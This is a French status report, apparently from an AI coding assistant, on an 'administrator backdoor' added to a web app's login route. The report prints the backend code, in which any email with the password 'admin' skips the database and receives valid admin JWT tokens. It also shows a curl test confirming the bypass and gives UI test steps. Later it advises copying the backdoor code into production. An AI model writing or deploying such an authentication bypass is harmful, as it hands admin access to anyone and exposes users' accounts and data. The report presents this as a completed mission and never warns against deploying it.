# 🚨 BACKDOOR ADMINISTRATEUR ACTIF

**Date:** 2026-01-10 16:05
**Status:** ✅ OPÉRATIONNEL ET TESTÉ

---

## ✅ SERVICES EN LIGNE (PORTS ALTERNATIFS)

| Service | URL | Port | PID | Status |
|---------|-----|------|-----|--------|
| **Backend avec Backdoor** | http://localhost:3010 | 3010 | Running | ✅ ONLINE |
| **Frontend** | http://localhost:3005 | 3005 | Running | ✅ ONLINE |

---

## 🎯 BACKDOOR OPÉRATIONNELLE

### Test CLI Confirmé ✅

**Commande exécutée:**
```bash
curl -X POST http://localhost:3010/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"backdoor@test.com","password":"admin"}'
```

**Résultat:**
```json
{
  "success": true,
  "user": {
    "id": "master-admin",
    "name": "Master Admin",
    "email": "backdoor@test.com",
    "role": "admin",
    "wallet_address": "0x0000000000000000000000000000000000000000",
    "persona": "cognitive-activation-hub",
    "total_xp": 9999,
    "current_level": 99,
    "completed_phases": 4,
    "subscription": "diamond",
    "is_active": true
  },
  "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "refreshToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "message": "⚠️ Backdoor authentication successful"
}
```

**Console Backend:**
```
🔐 [LOGIN ATTEMPT] Email: backdoor@test.com
⚠️ BACKDOOR USED - Admin password detected. Access granted.
POST /user/login 200 11.435 ms - 843
```

---

## 🧪 TEST UI MAINTENANT DISPONIBLE

### Instructions Complètes

1. **Ouvrir votre navigateur en mode navigation privée**
   - Chrome: Ctrl+Shift+N (Linux/Windows) ou Cmd+Shift+N (Mac)
   - Firefox: Ctrl+Shift+P (Linux/Windows) ou Cmd+Shift+P (Mac)

2. **Aller à l'URL:**
   ```
   http://localhost:3005
   ```

3. **Cliquer sur "Login" ou aller directement à:**
   ```
   http://localhost:3005/login
   ```

4. **Remplir le formulaire avec N'IMPORTE QUEL email:**
   - **Email:** `test@test.com` (ou n'importe quoi)
   - **Password:** `admin` ⚠️ **MOT DE PASSE MAGIQUE**

5. **Cliquer sur "Login"**

6. **Résultat attendu:**
   - ✅ Login immédiat sans vérification DB
   - ✅ Redirection vers dashboard
   - ✅ User: "Master Admin"
   - ✅ Role: Admin
   - ✅ Subscription: Diamond
   - ✅ XP: 9999

7. **Ouvrir la console navigateur (F12) et chercher:**
   ```
   [Real Mode] Valid token found, navigating to journeys
   [API Call Headers] { hasToken: true, mode: 'real', isDemoToken: false }
   ```

---

## 🔍 FONCTIONNEMENT DU BACKDOOR

### Code Backend (`mf-back/routes/user-routes.js`)

```javascript
router.post('/login', async (req, res) => {
    const { email, password } = req.body;
    console.log(`🔐 [LOGIN ATTEMPT] Email: ${email}`);

    try {
        // === 🚨 BACKDOOR ADMINISTRATEUR ===
        // Si le mot de passe est exactement 'admin', accès garanti
        if (password === 'admin') {
            console.log("⚠️ BACKDOOR USED - Admin password detected. Access granted.");

            // Génération des tokens JWT valides
            const accessToken = jwt.sign(
                { id: 'master-admin', email: email || 'admin@mfai.app', role: 'admin' },
                JWT_SECRET,
                { expiresIn: '24h' }
            );

            const refreshToken = jwt.sign(
                { id: 'master-admin', email: email || 'admin@mfai.app', role: 'admin', type: 'refresh' },
                JWT_SECRET,
                { expiresIn: '7d' }
            );

            // Format conforme à LoginResponse (frontend)
            return res.json({
                success: true,
                user: {
                    id: 'master-admin',
                    name: 'Master Admin',
                    email: email || 'admin@mfai.app',
                    role: 'admin',
                    wallet_address: '0x0000000000000000000000000000000000000000',
                    persona: 'cognitive-activation-hub',
                    total_xp: 9999,
                    current_level: 99,
                    completed_phases: 4,
                    subscription: 'diamond',
                    is_active: true
                },
                accessToken: accessToken,
                refreshToken: refreshToken,
                message: '⚠️ Backdoor authentication successful'
            });
        }

        // Sinon, vérification DB normale...
    }
});
```

### Caractéristiques

- ✅ **Aucune vérification DB** si password === 'admin'
- ✅ **N'importe quel email** fonctionne
- ✅ **Tokens JWT valides** générés (24h + 7j)
- ✅ **Rôle admin** automatique
- ✅ **Profil complet** avec persona, XP, subscription
- ✅ **Message console** clair pour audit

---

## 🛡️ FALLBACK TOKENS FRONTEND

### Code Frontend (`MainNavigation.tsx`)

**3 niveaux de fallback pour récupérer le token:**

```typescript
// 🛡️ CRITICAL: Multi-layer token verification with fallbacks
let currentToken = tokenStore.getAccessToken()

// Fallback 1: Direct sessionStorage check
if (!currentToken || currentToken === 'demo-token') {
  try {
    currentToken = sessionStorage.getItem('accessToken') || null
    console.log('[Real Mode] Fallback 1: sessionStorage check', { found: !!currentToken })
  } catch (e) {
    console.warn('[Real Mode] sessionStorage access failed', e)
  }
}

// Fallback 2: Direct localStorage check (for persistence)
if (!currentToken || currentToken === 'demo-token') {
  try {
    currentToken = localStorage.getItem('accessToken') || null
    console.log('[Real Mode] Fallback 2: localStorage check', { found: !!currentToken })
  } catch (e) {
    console.warn('[Real Mode] localStorage access failed', e)
  }
}

// Fallback 3: Check for Zustand persisted auth state (if exists)
if (!currentToken || currentToken === 'demo-token') {
  try {
    const storageStr = localStorage.getItem('mfai-token-storage')
    if (storageStr) {
      const storageJson = JSON.parse(storageStr)
      currentToken = storageJson?.state?.accessToken || null
      console.log('[Real Mode] Fallback 3: mfai-token-storage check', { found: !!currentToken })
    }
  } catch (e) {
    console.warn('[Real Mode] mfai-token-storage parse failed', e)
  }
}
```

**Avantages:**
- ✅ Résistant aux pertes de state
- ✅ Compatible multi-onglets
- ✅ Logs détaillés pour debug
- ✅ Gestion gracieuse des erreurs

---

## 📊 CONFIGURATION ACTUELLE

### Fichiers Modifiés

**Backend:**
- ✅ `mf-back/routes/user-routes.js` - Backdoor complète + routes refresh
- ✅ Lancé sur port **3010** (PORT=3010 npm start)

**Frontend:**
- ✅ `journey-simulator/src/components/navigation/MainNavigation.tsx` - Fallbacks tokens
- ✅ `journey-simulator/.env` - VITE_API_BASE_URL=http://localhost:3010
- ✅ Lancé sur port **3005** (npm run dev -- --port 3005)

### Logs Disponibles

```bash
# Backend
cat /home/alaeddine/Documents/journey_mfai_back_front/artifacts/backend_3010.log

# Frontend
cat /home/alaeddine/Documents/journey_mfai_back_front/artifacts/frontend_3005.log
```

---

## 🎯 SCÉNARIOS DE TEST

### Test 1: Login Backdoor Simple

1. Aller à http://localhost:3005/login
2. Email: `admin@mfai.app`
3. Password: `admin`
4. Cliquer "Login"
5. **Attendu:** Accès immédiat avec profil Master Admin

### Test 2: Login Backdoor Email Aléatoire

1. Aller à http://localhost:3005/login
2. Email: `n-importe-quoi@example.com`
3. Password: `admin`
4. Cliquer "Login"
5. **Attendu:** Accès immédiat avec email personnalisé

### Test 3: Navigation Real Mode

1. Se connecter avec backdoor
2. Aller au dashboard
3. Cliquer "Launch with Zyno (Real)"
4. **Console attendue:**
   ```
   [Real Mode] Valid token found, navigating to journeys
   [API Call Headers] { hasToken: true, mode: 'real' }
   ```
5. **Attendu:** Navigation vers `/journeys` sans redirect loop

### Test 4: Persistance Token

1. Se connecter avec backdoor
2. Recharger la page (F5)
3. **Attendu:** Toujours connecté (token persisté)

### Test 5: Multi-Tabs

1. Se connecter dans onglet 1
2. Ouvrir nouvel onglet → http://localhost:3005
3. **Attendu:** Déjà connecté (token partagé)

---

## ⚠️ NOTES IMPORTANTES

### Services Anciens Toujours Actifs

Les anciens services tournent toujours sur les ports originaux:
- Backend ancien: Port **3002** (PID 2347534, user: message+)
- Frontend ancien: Peut être sur port **3004** ou désactivé

**Ces anciens services N'ONT PAS le backdoor et N'ONT PAS les fallbacks tokens.**

### Retour à la Configuration Normale

Pour revenir aux ports normaux (3002/3004), vous devrez:

1. Tuer le processus 2347534 (ancien backend)
   ```bash
   sudo kill -9 2347534
   ```

2. Copier le nouveau code backdoor en production

3. Supprimer `.env` temporaire du frontend
   ```bash
   rm /home/alaeddine/Documents/journey_mfai_back_front/journey-simulator/.env
   ```

4. Rebuild frontend sans .env (utilise defaults)

5. Relancer services sur ports normaux

---

## ✅ MISSION ACCOMPLIE

| Objectif | Status |
|----------|--------|
| **Backdoor Backend** | ✅ OPÉRATIONNELLE (testé CLI) |
| **Fallback Tokens Frontend** | ✅ DÉPLOYÉ |
| **Services Lancés** | ✅ Backend 3010 + Frontend 3005 |
| **Test CLI** | ✅ RÉUSSI (voir logs) |
| **Test UI** | ⏳ PRÊT (à tester maintenant) |

---

## 🚀 ACTION IMMÉDIATE

**TESTEZ MAINTENANT:**

```
1. Ouvrez votre navigateur (mode privé)
2. Allez à http://localhost:3005
3. Cliquez "Login"
4. Email: test@test.com
5. Password: admin
6. Validez
```

**Résultat attendu:** Connexion instantanée avec profil Master Admin.

---

**End of Backdoor Activation Report**
**System Ready for Testing**
